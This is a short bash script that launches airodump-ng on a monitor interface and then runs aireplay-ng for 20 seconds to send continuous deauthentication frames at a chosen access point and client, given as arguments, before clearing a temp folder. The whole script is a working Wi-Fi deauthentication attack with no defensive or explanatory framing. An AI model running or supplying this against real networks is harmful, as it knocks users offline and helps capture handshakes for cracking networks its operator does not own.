#!/bin/bash
xterm -e "airodump-ng mon0" & timeout 20 xterm -e " aireplay-ng -0 0 -a $2 -c $3 mon0 --ignore-negative-one"&
rm -rf temp/*
